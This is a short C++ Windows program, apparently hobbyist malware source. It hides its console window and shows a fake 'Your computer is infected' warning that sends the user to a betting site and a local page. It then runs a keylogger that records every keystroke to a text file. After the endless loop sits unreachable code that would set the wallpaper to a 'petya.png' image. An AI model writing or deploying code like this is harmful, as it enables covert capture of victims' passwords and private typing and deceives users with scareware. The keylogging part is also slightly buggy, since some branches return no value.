#include <Windows.h>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void WriteData(std::string Text) {
    ofstream LogFile;
    LogFile.open("Keylogs.txt", fstream::app);
    LogFile << Text;
    LogFile.close();
}

void Stealth() {
    HWND hWnd;
    AllocConsole();
    hWnd = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(hWnd, 0);
}

bool isKeyListed(int vKey) {
    switch (vKey) {
        case VK_RETURN:
            WriteData("\n");
            break;
        case VK_SPACE:
            WriteData(" ");
            break;
        case VK_OEM_PERIOD:
            WriteData(".");
            break;
        default: return false;
    }
}

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);
    Stealth();

    MessageBox(NULL, "Your computer is infected, to eliminate the threats you will be redirected to the page with our antivirus", "Warning", MB_OK | MB_ICONERROR);

    int i = 0;
    while(i < 10){
        ShellExecute(NULL, "open", "https://www.favbet.ua/uk/", NULL, NULL, SW_SHOWNORMAL);
        i++;
    }

    ShellExecute(NULL, "open", "index.html", NULL, NULL, SW_SHOWNORMAL);

    char Key;
    while (1) {
        for (Key = 8; Key <= 255; Key++) {
            if (GetAsyncKeyState(Key) == -32767) {
                if (isKeyListed(Key) == 0) {
                    ofstream LogFile;
                    LogFile.open("Keylogs.txt", fstream::app);
                    LogFile << Key;
                    LogFile.close();
                }
            }
        }
    }

    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, (PVOID)"C:\\Users\\gonch\\CLionProjects\\untitled2\\cmake-build-debug\\petya.png", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    return 0;
}




